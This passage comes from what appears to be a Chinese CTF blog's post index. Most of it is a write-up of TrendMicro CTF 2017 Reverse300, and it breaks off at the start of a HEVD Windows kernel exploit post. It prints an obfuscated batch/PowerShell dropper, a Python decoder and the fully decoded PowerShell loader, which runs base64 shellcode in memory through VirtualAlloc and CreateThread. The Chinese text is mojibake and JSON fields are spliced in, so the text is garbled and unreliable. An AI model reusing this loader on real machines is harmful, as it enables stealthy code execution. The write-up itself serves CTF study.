AFGOALALABbAFUASQBuAHQAMwAyAFGOALAKQAgACgAWwBVAEkAbgBGOALADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAGGOALAcwBlAHQAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQ^BsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAGGOALAZQBtAHMAZQBGOALACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoACGOALAMQApADsAJABpACsAKwApACAAewAkAGGOALAZQBtAHMAZQBGOALAC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwBGOALAGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAEGOALAYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUABGOALAHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUABGOALAHIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AHGOALAfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQBGOALAGUARgBvAHIARgB1AG4AYwBGOALAGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQBGOALAGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUABGOALAHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AHGOALAYwBhAHQAYwBoAHsAfQBlAHgAaQBGOALADsA&quot;cmd /c &quot;powershell -command &quot;$a=get-date;$t=[system.Text.Encoding]::UTF8.GetBytes('fzEvD');for ($i=0;$i -le ($t.Length-1);$i++){$t[$i]=$t[$i]-$a.hour} $d=[system.Text.Encoding]::UTF8.GetString($t);[Environment]::SetEnvironmentVariable('q', $d, 'User');&quot;cmd /c &quot;powershell -enc %q%%p:GOAL=0% &gt; NULecho %j%echo %q%set j=set k=set l=set m=set n=set o=set p= ç›´æ¥æ·»åŠ ä¸€ä¸ª 1echo %p:GOAL=0% ç„¶åå†™è„šæœ¬è·‘è¿™ä¸ªhourï¼Œçœ‹çœ‹åˆ°åº•æ˜¯å¤šå°‘ã€‚ é—®é¢˜åœ¨äºechoå‡ºæ¥çš„è¿™ä¸ªpï¼Œä¸­é—´æœ‰ä¸€ä¸ª.å·ï¼Œå¯¼è‡´è§£ç å¤±è´¥ã€‚ã€‚ã€‚ä¹‹å‰ä¸€ç›´æ²¡å‘ç°è¿™ä¸ªã€‚æ‰‹åŠ¨æ›¿æ¢ä¸€ä¸ªAè¿‡å»ã€‚ 123456789101112131415161718192021import base64base = &quot;GUAZQBwACgAOQAwACkAOwB0AHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuAD0AMAAsAE0AYQBuAGQAYQB0AG8AcgB5AD0AJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAF0AXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlAD0AWwBWAG8AaQBkAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAD0AWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgB0AEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAG0AaQB0AC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4AcwBpAEMAbABhAHMAcwAsAEEAdQB0AG8AQwBsAGEAcwBzACIALABbAFMAeQBzAHQAZQBtAC4ATQB1AGwAdABpAGMAYQBzAHQARABlAGwAZQBnAGEAdABlAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUAQwBvAG4AcwB0AHIAdQBjAHQAbwByACgAIgBSAFQAUwBwAGUAYwBpAGEAbABOAGEAbQBlACwASABpAGQAZQBCAHkAUwBpAGcALABQAHUAYgBsAGkAYwAiACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBDAGEAbABsAGkAbgBnAEMAbwBuAHYAZQBuAHQAaQBvAG4AcwBdADoAOgBTAHQAYQBuAGQAYQByAGQALAAkAFAAYQByAGEAbQBlAHQAZQByAHMAKQAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKAAiAFIAdQBuAHQAaQBtAGUALABNAGEAbgBhAGcAZQBkACIAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUATQBlAHQAaABvAGQAKAAiAEkAbgB2AG8AawBlACIALAAiAFAAdQBiAGwAaQBjACwASABpAGQAZQBCAHkAUwBpAGcALABOAGUAdwBTAGwAbwB0ACwAVgBpAHIAdAB1AGEAbAAiACwAJABSAGUAdAB1AHIAbgBUAHkAcABlACwAJABQAGEAcgBhAG0AZQB0AGUAcgBzACkALgBTAGUAdABJAG0AcABsAGUAbQBlAG4AdABhAHQAaQBvAG4ARgBsAGEAZwBzACgAIgBSAHUAbgB0AGkAbQBlACwATQBhAG4AYQBnAGUAZAAiACkAOwByAGUAdAB1AHIAbgAgACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4AQwByAGUAYQB0AGUAVAB5AHAAZQAoACkAOwB9AGYAdQBuAGMAdABpAG8AbgAgAGcAcAByAG8AYwB7AFAAYQByAGEAbQAgACgAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADAALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAE0AbwBkAHUAbABlACwAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADEALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAFAAcgBvAGMAZQBkAHUAcgBlACkAOwAkAFMAeQBzAHQAZQBtAEEAcwBzAGUAbQBiAGwAeQA9AFsAQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEcAZQB0AEEAcwBzAGUAbQBiAGwAaQBlAHMAKAApAHwAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAewAkAF8ALgBHAGwAbwBiAGEAbABBAHMAcwBlAG0AYgBsAHkAQwBhAGMAaABlACAALQBBAG4AZAAgACQAXwAuAEwAbwBjAGEAdABpAG8AbgAuAFMAcABsAGkAdAAoACIAXAAiACkAWwAtADEAXQAuAEUAcQB1AGEAbABzACgAIgBTAHkAcwB0AGUAbQAuAGQAbABsACIAKQB9ADsAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAD0AJABTAHkAcwB0AGUAbQBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBNAGkAYwByAG8AcwBvAGYAdAAuAFcAaQBuADMAMgAuAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMAIgApADsAcgBlAHQAdQByAG4AIAAkAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACIARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoAFsAUwB5AHMAdABlAG0ALABATgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQB0AE0AbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQB0AGUAWwBdAF0AJABzAGMAMwAyACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQB0AGUAOwBpAGYAKAAkAGEALgBNAG8AbgB0AGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAF0AIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBbAF0AXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwB0AGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgAC0AZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0AKQAgACgAWwBVAEkAbgB0ADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAG0AcwBlAHQAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAG0AZQBtAHMAZQB0ACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAG0AZQBtAHMAZQB0AC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUAB0AHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUAB0AHIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AH0AfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQB0AGUARgBvAHIARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUAB0AHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AH0AYwBhAHQAYwBoAHsAfQBlAHgAaQB0ADsA&quot;for k in xrange(24): front = ''.join(chr(ord(c) - k) for c in 'fzEvD') try: out = base64.b64decode('{}{}'.format(front, base)).replace('\\x00', '') print &quot;%d---&gt;%s&quot; % (k,out) except Exception,e: passfront = ''.join(chr(ord(c) - 3) for c in 'fzEvD')out = base64.b64decode('{}{}'.format(front, base)).replace('\\x00', '')with open('final.bat','w+') as f: f.write(out) æ ¹æ®ç»“æœï¼Œå‘ç°houræ˜¯3ï¼Œæœ€åå¾—åˆ°è§£ç åçš„è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839sleep(90);try{ function gdelegate{ Param ([Parameter(Position=0,Mandatory=$True)] [Type[]] $Parameters,[Parameter(Position=1)] [Type] $ReturnType=[Void]); $TypeBuilder=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&quot;ReflectedDelegate&quot;)),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&quot;InMemoryModule&quot;,$false).DefineType(&quot;XXX&quot;,&quot;Class,Public,Sealed,AnsiClass,AutoClass&quot;,[System.MulticastDelegate]); $TypeBuilder.DefineConstructor(&quot;RTSpecialName,HideBySig,Public&quot;,[System.Reflection.CallingConventions]::Standard,$Parameters).SetImplementationFlags(&quot;Runtime,Managed&quot;); $TypeBuilder.DefineMethod(&quot;Invoke&quot;,&quot;Public,HideBySig,NewSlot,Virtual&quot;,$ReturnType,$Parameters).SetImplementationFlags(&quot;Runtime,Managed&quot;); return $TypeBuilder.CreateType(); } function gproc{Param ([Parameter(Position=0,Mandatory=$True)] [String] $Module,[Parameter(Position=1,Mandatory=$True)] [String] $Procedure); $SystemAssembly=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split(&quot;\\&quot;)[-1].Equals(&quot;System.dll&quot;)}; $UnsafeNativeMethods=$SystemAssembly.GetType(&quot;Microsoft.Win32.UnsafeNativeMethods&quot;);return $UnsafeNativeMethods.GetMethod(&quot;GetProcAddress&quot;).Invoke($null,@([System,@NRuntime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$UnsafeNativeMethods.GetMethod(&quot;GetModuleHandle&quot;).Invoke($null,@($Module)))),$Procedure)); } [Byte[]]$sc32 = [System.Convert]::FromBase64String($env:l+$env:O); $a=Get-Date; if($a.Month -ge 2){ exit; } [Uint32[]] $op=0; $r=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualProtect),(gdelegate @([Byte[]],[UInt32],[UInt32],[UInt32[]]) ([IntPtr])))).Invoke($sc32,$sc32.Length,0x40,$op); if($r -eq 0){$pr=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualAlloc),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32]) ([UInt32])))).Invoke(0,$sc32.Length,0x3000,0x40); if($pr -ne 0){ $memset=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc msvcrt.dll memset),(gdelegate @([UInt32],[UInt32],[UInt32]) ([IntPtr])))); for ($i=0;$i -le ($sc32.Length-1);$i++) { $memset.Invoke(($pr+$i), $sc32[$i], 1) }; ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$pr,$pr,0,0); } }else{ ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[Byte[]],[Byte[]],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$sc32,$sc32,0,0); } sleep(1200); }catch{}exit; åˆ†æå¯ä»¥å¾—åˆ°ï¼Œå°±æ˜¯è§£ç shellcodeæ‰§è¡Œçš„ã€‚ 1234set l=2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~1,1%14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+set m=moAsSAMOY%02maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==set n=LABNAmaodSDGASJOIHGI76msdm%ls:1qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+set o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg= åŒæ ·é€‚ç”¨echoçš„æ–¹æ³•å¾—åˆ°shellcodeçš„éƒ¨åˆ† 12eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg= 12345678# muhe @ muheMBP in ~ [23:07:13]$ pythonPython 2.7.10 (default, Feb 7 2017, 00:08:15)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg=&quot;)'\\xd9\\xeb\\x9b\\xd9t$\\xf41\\xd2\\xb2w1\\xc9d\\x8bq0\\x8bv\\x0c\\x8bv\\x1c\\x8bF\\x08\\x8b~ \\x8b68O\\x18u\\xf3Y\\x01\\xd1\\xff\\xe1`\\x8bl$$\\x8bE&lt;\\x8bT(x\\x01\\xea\\x8bJ\\x18\\x8bZ \\x01\\xeb\\xe34I\\x8b4\\x8b\\x01\\xee1\\xff1\\xc0\\xfc\\xac\\x84\\xc0t\\x07\\xc1\\xcf\\r\\x01\\xc7\\xeb\\xf4;|$(u\\xe1\\x8bZ$\\x01\\xebf\\x8b\\x0cK\\x8bZ\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89D$\\x1ca\\xc3\\xb2\\x08)\\xd4\\x89\\xe5\\x89\\xc2h\\x8eN\\x0e\\xecR\\xe8\\x9f\\xff\\xff\\xff\\x89E\\x04\\xbb~\\xd8\\xe2s\\x87\\x1c$R\\xe8\\x8e\\xff\\xff\\xff\\x89E\\x08hll Ah32.dhuser0\\xdb\\x88\\\\$\\n\\x89\\xe6V\\xffU\\x04\\x89\\xc2P\\xbb\\xa8\\xa2M\\xbc\\x87\\x1c$R\\xe8_\\xff\\xff\\xffhroX hdMichTren1\\xdb\\x88\\\\$\\n\\x89\\xe3h!}X hgainhsMeAh!ItIhherehlloThF{HehTMCT1\\xc9\\x88L$\\x1e\\x89\\xe11\\xd2RSQR\\xff\\xd01\\xc0P\\xffU\\x08' å¯ä»¥çœ‹åˆ°å­—ç¬¦ä¸²â€¦é‡å®šå‘åˆ°æ–‡ä»¶ stringsä¸€ä¸‹å°±çœ‹åˆ°flagäº†ã€‚","link":"/2017/06/28/TrendMicro-CTF-2017-Reverse300/"},{"title":"Windows-Kernel-Exploit-Study(3)","text":"0x00:è¿™æ˜¯HEVDç³»åˆ—ä¸­å…³äºæ ˆä¸Šå˜é‡æœªåˆå§‹åŒ–çš„ä¸€ç§åˆ©ç”¨ï¼Œåœ¨kernelçš„exploitä¸­ï¼Œè¿™ç§æƒ…å†µå¾ˆå°‘å‘ç”Ÿï¼Œä½œä¸ºä¸€ä¸ªdemoå¯ä»¥ä½“ä¼šä¸€ä¸‹å¯¹äºè¿™ç§æ¼æ´çš„Kernel stack sprayçš„åˆ©ç”¨æ–¹å¼ã€‚åœ¨UAFçš„æ¼æ´ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨heap sprayçš„æ–¹å¼å»åˆ©ç”¨ï¼Œç„¶è€ŒKernel stack sprayå·®ä¸å¤šï¼Œä¸è¿‡æ˜¯æå‰æŠŠæ•°æ®â€å–·å°„â€åˆ°å†…æ ¸æ ˆï¼Œå æ®æœªåˆå§‹åŒ–çš„å˜é‡çš„ä½ç½®ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒè¿™ä¸ªå‡½æ•°ï¼Œè°ƒç”¨ï¼Œå»æ‰§è¡Œshellcodeï¼Œä»è€Œå®Œæˆææƒã€‚ å…³äºç¯å¢ƒåŠå·¥å…·ï¼š windows7 cn x86 windbg osrloader 0x01:å…ˆæ¥çœ‹vulnä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869VOID UninitializedStackVariableObjectCallback() { PAGED_CODE(); DbgPrint(&quot;[+] Uninitialized Stack Variable Object Callback\\n&quot;);}/// &lt;summary&gt;/// Trigger the Uninitialized Stack Variable Vulnerability/// &lt;/summary&gt;/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) { ULONG UserValue = 0; ULONG MagicValue = 0xBAD0B0B0; NTSTATUS Status = STATUS_SUCCESS;#ifdef SECURE // Secure Note: This is secure because the developer is properly initializing // UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling // the callback UNINITIALIZED_STACK_VARIABLE 